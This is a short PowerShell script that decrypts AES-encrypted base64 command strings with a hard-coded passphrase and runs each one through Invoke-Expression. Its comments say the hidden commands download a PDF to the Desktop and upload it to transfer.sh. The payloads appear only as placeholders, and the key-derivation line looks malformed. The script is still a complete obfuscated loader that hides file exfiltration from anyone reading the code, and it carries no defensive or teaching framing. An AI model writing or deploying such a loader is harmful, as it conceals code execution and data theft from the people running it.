# first.txt

function Decrypt-String {
    param(
        [string]$CipherTextBase64,
        [string]$Password
    )
    # derive 256-bit key = UTF8(password padded with spaces to 32 bytes)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes( ($Password.PadRight(32)) [0..31] -join '' )
    # zero IV
    $iv = New-Object byte[] 16

    $cipherBytes = [Convert]::FromBase64String($CipherTextBase64)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key     = $keyBytes
    $aes.IV      = $iv

    $decryptor = $aes.CreateDecryptor()
    $ms = New-Object IO.MemoryStream(,$cipherBytes)
    $cs = New-Object Security.Cryptography.CryptoStream($ms, $decryptor, [Security.Cryptography.CryptoStreamMode]::Read)
    $sr = New-Object IO.StreamReader($cs)
    $plain = $sr.ReadToEnd()
    $sr.Close(); $cs.Close(); $ms.Close()
    return $plain
}

$EncryptedCommands = @(
    # (1) Download the “Have I Been Pwned?” PDF to Desktop
    '<BASE64-DOWNLOAD-PAYLOAD>',
    # (2) Upload it to transfer.sh and dump the URL to console
    '<BASE64-EXFIL-PAYLOAD>'
)

$passphrase = 'Junade Ali'
foreach($blob in $EncryptedCommands){
    $cmd = Decrypt-String $blob $passphrase
    Invoke-Expression $cmd
}
